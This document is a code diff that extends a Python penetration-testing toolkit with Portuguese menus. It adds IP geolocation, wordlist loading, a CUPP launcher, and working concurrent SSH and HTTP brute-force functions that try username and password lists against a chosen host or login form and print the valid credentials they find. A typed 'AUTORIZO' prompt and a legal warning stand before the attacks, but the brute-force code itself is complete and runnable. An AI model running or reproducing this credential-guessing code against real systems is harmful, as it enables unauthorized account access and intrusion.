@@ -7,9 +7,13 @@ import re
 import asyncio
 import ipaddress
 import logging
+import shutil
+import subprocess
+import socket
 import requests
 import whois
 import dns.resolver
+from pathlib import Path
 from typing import Dict, List, Tuple, Optional
 from colorama import Fore, Style, init
 from scapy.all import ARP, Ether, srp, TCP, IP, sr1
@@ -249,6 +253,197 @@ def dns_lookup(domain: str,
     except Exception as e:
         return [f"Error: {e}"]
     
+def geo_ip(target: str) -> Dict[str, str]:
+    """Geolocalização de IP/host via ip-api.com (free tier, sem key)."""
+    try:
+        ip = socket.gethostbyname(target)
+    except socket.gaierror as e:
+        return {"erro": f"Falha ao resolver {target}: {e}"}
+
+    fields = "status,message,continent,country,regionName,city,zip,lat,lon,timezone,isp,org,as,reverse,mobile,proxy,hosting,query"
+    try:
+        response = requests.get(
+            f"http://ip-api.com/json/{ip}",
+            params={"fields": fields},
+            headers={"User-Agent": "gyntoolkit/2.0"},
+            timeout=10,
+        )
+        response.raise_for_status()
+        data = response.json()
+        if data.get("status") != "success":
+            return {"erro": data.get("message", "Consulta falhou")}
+        return data
+    except (requests.RequestException, ValueError) as e:
+        log.warning("geo_ip %s falhou: %s", target, e)
+        return {"erro": str(e)}
+
+
+def print_ethical_warning(action: str) -> bool:
+    """Alerta ético antes de operação intrusiva. Retorna True se autorizado."""
+    print(f"\n{Fore.RED}{'=' * 60}{Style.RESET_ALL}")
+    print(f"{Fore.RED}[!] AVISO: {action} é ataque ativo.{Style.RESET_ALL}")
+    print(f"{Fore.RED}[!] Use apenas em alvos com autorização por escrito.{Style.RESET_ALL}")
+    print(f"{Fore.RED}[!] Uso não autorizado é crime (Lei 12.737/12, CFAA, etc).{Style.RESET_ALL}")
+    print(f"{Fore.RED}{'=' * 60}{Style.RESET_ALL}")
+    confirm = input(f"{Fore.YELLOW}Confirmar autorização? (digite 'AUTORIZO'): {Style.RESET_ALL}").strip()
+    return confirm == "AUTORIZO"
+
+
+def load_wordlist(path: str) -> List[str]:
+    """Carrega wordlist do disco, deduplicando e ignorando linhas vazias."""
+    p = Path(path).expanduser()
+    if not p.is_file():
+        print(f"{Fore.RED}Wordlist não encontrada: {p}{Style.RESET_ALL}")
+        return []
+    try:
+        with p.open("r", encoding="utf-8", errors="ignore") as f:
+            words = [w.strip() for w in f if w.strip()]
+        return list(dict.fromkeys(words))
+    except OSError as e:
+        log.error("Falha ao ler wordlist %s: %s", p, e)
+        return []
+
+
+def cupp_generate() -> None:
+    """Chama CUPP interativo p/ gerar wordlist customizada."""
+    cupp_paths = [
+        Path(__file__).parent / "cupp" / "cupp.py",
+        Path.cwd() / "cupp" / "cupp.py",
+    ]
+    cupp = next((p for p in cupp_paths if p.is_file()), None)
+    if not cupp:
+        print(f"{Fore.RED}CUPP não encontrado. Clone: git clone https://github.com/Mebus/cupp.git{Style.RESET_ALL}")
+        return
+
+    python_exe = shutil.which("python") or shutil.which("python3") or sys.executable
+    try:
+        subprocess.run([python_exe, str(cupp), "-i"], check=False)
+    except OSError as e:
+        log.error("CUPP execução falhou: %s", e)
+        print(f"{Fore.RED}Erro ao rodar CUPP: {e}{Style.RESET_ALL}")
+
+
+async def _ssh_try(host: str, port: int, user: str, password: str, timeout: int) -> Optional[Tuple[str, str]]:
+    """Tenta uma credencial SSH. Retorna (user, pass) se sucesso."""
+    import paramiko
+
+    def _attempt() -> bool:
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        try:
+            client.connect(
+                host, port=port, username=user, password=password,
+                timeout=timeout, allow_agent=False, look_for_keys=False,
+                banner_timeout=timeout, auth_timeout=timeout,
+            )
+            return True
+        except paramiko.AuthenticationException:
+            return False
+        except (paramiko.SSHException, OSError, EOFError) as e:
+            log.debug("SSH %s@%s:%s erro: %s", user, host, port, e)
+            return False
+        finally:
+            client.close()
+
+    ok = await asyncio.to_thread(_attempt)
+    return (user, password) if ok else None
+
+
+async def ssh_bruteforce(
+    host: str,
+    users: List[str],
+    passwords: List[str],
+    port: int = 22,
+    workers: int = 8,
+    delay: float = 0.1,
+    timeout: int = 5,
+) -> List[Tuple[str, str]]:
+    """Brute-force SSH assíncrono com controle de concorrência."""
+    try:
+        import paramiko  # noqa: F401
+    except ImportError:
+        print(f"{Fore.RED}paramiko não instalado. Rode: pip install paramiko{Style.RESET_ALL}")
+        return []
+
+    sem = asyncio.Semaphore(workers)
+    found: List[Tuple[str, str]] = []
+    total = len(users) * len(passwords)
+    tried = 0
+
+    async def _guarded(u: str, p: str):
+        nonlocal tried
+        async with sem:
+            await asyncio.sleep(delay)
+            result = await _ssh_try(host, port, u, p, timeout)
+            tried += 1
+            if tried % 25 == 0:
+                print(f"{Fore.CYAN}[{tried}/{total}] tentativas...{Style.RESET_ALL}")
+            if result:
+                found.append(result)
+                print(f"{Fore.GREEN}[+] SSH válido: {u}:{p}{Style.RESET_ALL}")
+
+    tasks = [_guarded(u, p) for u in users for p in passwords]
+    await asyncio.gather(*tasks)
+    return found
+
+
+async def http_bruteforce(
+    url: str,
+    users: List[str],
+    passwords: List[str],
+    mode: str = "basic",
+    user_field: str = "username",
+    pass_field: str = "password",
+    fail_signature: str = "",
+    workers: int = 10,
+    delay: float = 0.1,
+    timeout: int = 10,
+) -> List[Tuple[str, str]]:
+    """Brute-force HTTP (basic-auth ou form POST)."""
+    try:
+        import aiohttp
+    except ImportError:
+        print(f"{Fore.RED}aiohttp não instalado. Rode: pip install aiohttp{Style.RESET_ALL}")
+        return []
+
+    sem = asyncio.Semaphore(workers)
+    found: List[Tuple[str, str]] = []
+    total = len(users) * len(passwords)
+    tried = 0
+
+    timeout_cfg = aiohttp.ClientTimeout(total=timeout)
+    connector = aiohttp.TCPConnector(limit=workers, ssl=False)
+
+    async with aiohttp.ClientSession(timeout=timeout_cfg, connector=connector) as session:
+        async def _attempt(u: str, p: str):
+            nonlocal tried
+            async with sem:
+                await asyncio.sleep(delay)
+                try:
+                    if mode == "basic":
+                        auth = aiohttp.BasicAuth(u, p)
+                        async with session.get(url, auth=auth) as r:
+                            ok = r.status not in (401, 403)
+                    else:
+                        payload = {user_field: u, pass_field: p}
+                        async with session.post(url, data=payload, allow_redirects=False) as r:
+                            body = await r.text()
+                            ok = r.status in (200, 302) and (not fail_signature or fail_signature not in body)
+                except (aiohttp.ClientError, asyncio.TimeoutError) as e:
+                    log.debug("HTTP %s %s:%s erro: %s", url, u, p, e)
+                    ok = False
+
+                tried += 1
+                if tried % 25 == 0:
+                    print(f"{Fore.CYAN}[{tried}/{total}] tentativas...{Style.RESET_ALL}")
+                if ok:
+                    found.append((u, p))
+                    print(f"{Fore.GREEN}[+] HTTP válido: {u}:{p}{Style.RESET_ALL}")
+
+        await asyncio.gather(*[_attempt(u, p) for u in users for p in passwords])
+    return found
+
+
 DNS_TYPES = [
     ("A",     "Endereço IPv4"),
     ("AAAA",  "Endereço IPv6"),
@@ -322,13 +517,95 @@ async def main_flow():
                 for rec in records:
                     print(f" - {rec}")
 
-            
+            elif sub_choice == 3:
+                target = sanitize_input(
+                    input(f"\n{Fore.CYAN}IP ou domínio: {Style.RESET_ALL}"),
+                    r"[A-Za-z0-9.:-]",
+                )
+                print(f"\n{Fore.GREEN}Consultando geolocalização de {target}...{Style.RESET_ALL}\n")
+                info = geo_ip(target)
+                if "erro" in info:
+                    print(f"{Fore.RED}{info['erro']}{Style.RESET_ALL}")
+                else:
+                    label_map = {
+                        "query": "IP", "country": "País", "regionName": "Região",
+                        "city": "Cidade", "zip": "CEP", "lat": "Latitude", "lon": "Longitude",
+                        "timezone": "Fuso", "isp": "ISP", "org": "Organização", "as": "ASN",
+                        "reverse": "Reverse DNS", "mobile": "Mobile", "proxy": "Proxy",
+                        "hosting": "Hosting",
+                    }
+                    for key, label in label_map.items():
+                        if key in info:
+                            print(f" {Fore.YELLOW}{label}:{Style.RESET_ALL} {info[key]}")
+
         elif choice == 2:  # Brute Force
             sub_choice = show_menu("Brute Force:", [
-                "Gerar Wordlist",
+                "Gerar Wordlist (CUPP)",
                 "Ataque SSH",
                 "Ataque HTTP"
             ])
+
+            if sub_choice == 1:
+                cupp_generate()
+
+            elif sub_choice == 2:
+                if not print_ethical_warning("Brute-force SSH"):
+                    print(f"{Fore.RED}Autorização não confirmada. Abortando.{Style.RESET_ALL}")
+                    input(f"\n{Fore.YELLOW}Pressione Enter para continuar...{Style.RESET_ALL}")
+                    continue
+                host = sanitize_input(input(f"\n{Fore.CYAN}Host alvo: {Style.RESET_ALL}"))
+                port = int(input(f"{Fore.CYAN}Porta [22]: {Style.RESET_ALL}") or 22)
+                user_input = input(f"{Fore.CYAN}Usuário único ou path de wordlist de usuários: {Style.RESET_ALL}").strip()
+                users = load_wordlist(user_input) if Path(user_input).is_file() else [user_input]
+                pass_path = input(f"{Fore.CYAN}Path da wordlist de senhas: {Style.RESET_ALL}").strip()
+                passwords = load_wordlist(pass_path)
+                if not users or not passwords:
+                    print(f"{Fore.RED}Wordlist vazia. Abortando.{Style.RESET_ALL}")
+                    input(f"\n{Fore.YELLOW}Pressione Enter para continuar...{Style.RESET_ALL}")
+                    continue
+                workers = int(input(f"{Fore.CYAN}Workers concorrentes [8]: {Style.RESET_ALL}") or 8)
+                print(f"\n{Fore.CYAN}Iniciando SSH brute em {host}:{port} ({len(users)}x{len(passwords)} = {len(users)*len(passwords)} combos)...{Style.RESET_ALL}\n")
+                results = await ssh_bruteforce(host, users, passwords, port=port, workers=workers)
+                if results:
+                    print(f"\n{Fore.GREEN}Credenciais encontradas:{Style.RESET_ALL}")
+                    for u, p in results:
+                        print(f"  {u}:{p}")
+                else:
+                    print(f"\n{Fore.RED}Nenhuma credencial válida encontrada.{Style.RESET_ALL}")
+
+            elif sub_choice == 3:
+                if not print_ethical_warning("Brute-force HTTP"):
+                    print(f"{Fore.RED}Autorização não confirmada. Abortando.{Style.RESET_ALL}")
+                    input(f"\n{Fore.YELLOW}Pressione Enter para continuar...{Style.RESET_ALL}")
+                    continue
+                url = input(f"\n{Fore.CYAN}URL alvo (com http/https): {Style.RESET_ALL}").strip()
+                mode = (input(f"{Fore.CYAN}Modo [basic/form] (default basic): {Style.RESET_ALL}").strip().lower() or "basic")
+                user_field = pass_field = fail_sig = ""
+                if mode == "form":
+                    user_field = input(f"{Fore.CYAN}Nome do campo usuário [username]: {Style.RESET_ALL}").strip() or "username"
+                    pass_field = input(f"{Fore.CYAN}Nome do campo senha [password]: {Style.RESET_ALL}").strip() or "password"
+                    fail_sig = input(f"{Fore.CYAN}Trecho de texto que indica falha (ex: 'Invalid'): {Style.RESET_ALL}").strip()
+                user_input = input(f"{Fore.CYAN}Usuário único ou path de wordlist: {Style.RESET_ALL}").strip()
+                users = load_wordlist(user_input) if Path(user_input).is_file() else [user_input]
+                pass_path = input(f"{Fore.CYAN}Path da wordlist de senhas: {Style.RESET_ALL}").strip()
+                passwords = load_wordlist(pass_path)
+                if not users or not passwords:
+                    print(f"{Fore.RED}Wordlist vazia. Abortando.{Style.RESET_ALL}")
+                    input(f"\n{Fore.YELLOW}Pressione Enter para continuar...{Style.RESET_ALL}")
+                    continue
+                workers = int(input(f"{Fore.CYAN}Workers concorrentes [10]: {Style.RESET_ALL}") or 10)
+                print(f"\n{Fore.CYAN}Iniciando HTTP brute em {url} ({len(users)*len(passwords)} combos)...{Style.RESET_ALL}\n")
+                results = await http_bruteforce(
+                    url, users, passwords, mode=mode,
+                    user_field=user_field, pass_field=pass_field,
+                    fail_signature=fail_sig, workers=workers,
+                )
+                if results:
+                    print(f"\n{Fore.GREEN}Credenciais encontradas:{Style.RESET_ALL}")
+                    for u, p in results:
+                        print(f"  {u}:{p}")
+                else:
+                    print(f"\n{Fore.RED}Nenhuma credencial válida encontrada.{Style.RESET_ALL}")
             
         elif choice == 3:  # Varredura Avançada
             target = sanitize_input(input(f"\n{Fore.CYAN}Alvo (IP/rede): {Style.RESET_ALL}"))
